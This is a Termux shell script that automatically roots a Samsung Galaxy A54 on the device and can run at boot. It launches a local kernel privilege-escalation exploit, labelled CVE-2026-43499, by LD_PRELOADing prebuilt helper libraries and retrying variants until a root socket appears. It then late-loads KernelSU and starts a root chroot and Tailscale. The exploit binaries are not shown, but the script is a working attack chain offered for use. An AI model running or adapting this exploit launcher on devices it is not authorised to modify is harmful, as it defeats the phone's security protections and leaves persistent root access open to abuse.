#!/data/data/com.termux/files/usr/bin/sh
# ==============================================================================
# Samsung Galaxy A54 (A546E) - On-Device (Termux) Auto-Root & Chroot Launcher
# ==============================================================================
# This script runs directly inside the phone (Termux) without requiring a PC.
# It can also be automated at device startup via Termux:Boot.
# ==============================================================================

LOGFILE="$HOME/reroot.log"
echo "[*] Auto-reroot triggered: $(date)" > "$LOGFILE"

TMP_PATH="/data/local/tmp"

# Check if root is already active
if su -c "id" 2>/dev/null | grep -q "uid=0"; then
    echo "[+] Root is already active!" >> "$LOGFILE"
else
    echo "[*] Configuring file execution permissions..." >> "$LOGFILE"
    chmod +x "$TMP_PATH/cve-2026-43499-root" \
             "$TMP_PATH/libcve43499root.so" \
             "$TMP_PATH/ksud-s25u-kdp" 2>/dev/null || true

    ACTIVE_HELPER=""

    run_exploit_attempt() {
        local helper="$1"
        local so="$2"
        [ -f "$TMP_PATH/$helper" ] || return 1
        [ -f "$TMP_PATH/$so" ] || return 1

        echo "[*] Trying variant: $helper + $so" >> "$LOGFILE"
        rm -f "$TMP_PATH/temp_su.sock"

        CVE43499_ROOT_HELPER="$TMP_PATH/$helper" \
        LD_PRELOAD="$TMP_PATH/$so" \
        /system/bin/true >> "$LOGFILE" 2>&1
        local ret=$?

        # Check for socket establishment
        for i in 1 2 3; do
            if [ -e "$TMP_PATH/temp_su.sock" ]; then
                echo "[+] Variant succeeded: socket established." >> "$LOGFILE"
                ACTIVE_HELPER="$helper"
                return 0
            fi
            sleep 1
        done

        echo "[-] Variant failed (exit: $ret), socket not found." >> "$LOGFILE"
        return 1
    }

    # Sequentially test variants until one creates the socket
    if ! run_exploit_attempt "cve-2026-43499-root" "cve-2026-43499-app.so"; then
        if ! run_exploit_attempt "cve-2026-43499-root" "cve-2026-43499.so"; then
            if ! run_exploit_attempt "libcve43499root.so" "cve-2026-43499-app.so"; then
                if ! run_exploit_attempt "libcve43499root.so" "cve-2026-43499.so"; then
                    echo "[-] All exploit variants failed. Reboot recommended." >> "$LOGFILE"
                    exit 1
                fi
            fi
        fi
    fi

    # KernelSU stage & late-load
    echo "[*] Staging KernelSU and invoking late-load..." >> "$LOGFILE"
    if [ -f "$TMP_PATH/ksud-next-a54x-A546EXXSKFZF4-kdp" ]; then
        cp "$TMP_PATH/ksud-next-a54x-A546EXXSKFZF4-kdp" "$TMP_PATH/.ksud-stage" 2>> "$LOGFILE"
        cp "$TMP_PATH/ksud-next-a54x-A546EXXSKFZF4-kdp" "$TMP_PATH/ksud-s25u-kdp" 2>> "$LOGFILE" || true
    elif [ -f "$TMP_PATH/ksud-s25u-kdp" ]; then
        cp "$TMP_PATH/ksud-s25u-kdp" "$TMP_PATH/.ksud-stage" 2>> "$LOGFILE"
    fi
    chmod 755 "$TMP_PATH/.ksud-stage" "$TMP_PATH/ksud-s25u-kdp" "$TMP_PATH/ksud-next-a54x-A546EXXSKFZF4-kdp" 2>/dev/null || true

    "$TMP_PATH/$ACTIVE_HELPER" --late-load >> "$LOGFILE" 2>&1
    sleep 2
fi

# Verify root access and start chroot
if su -c "id" 2>/dev/null | grep -q "uid=0"; then
    echo "[+] ROOT ELEVATION SUCCESSFUL! Starting Chroot and Tailscale..." >> "$LOGFILE"
    
    if [ -f "$TMP_PATH/start-chroot.sh" ]; then
        su -c "sh $TMP_PATH/start-chroot.sh daemon" >> "$LOGFILE" 2>&1
    elif [ -f "/data/local/chroot/start-chroot.sh" ]; then
        su -c "sh /data/local/chroot/start-chroot.sh daemon" >> "$LOGFILE" 2>&1
    elif [ -f "$HOME/start-chroot.sh" ]; then
        su -c "sh $HOME/start-chroot.sh daemon" >> "$LOGFILE" 2>&1
    fi
    echo "[+] Setup is ready and running: $(date)" >> "$LOGFILE"
else
    echo "[-] Root acquisition failed. A device reboot may be required due to KASLR." >> "$LOGFILE"
fi
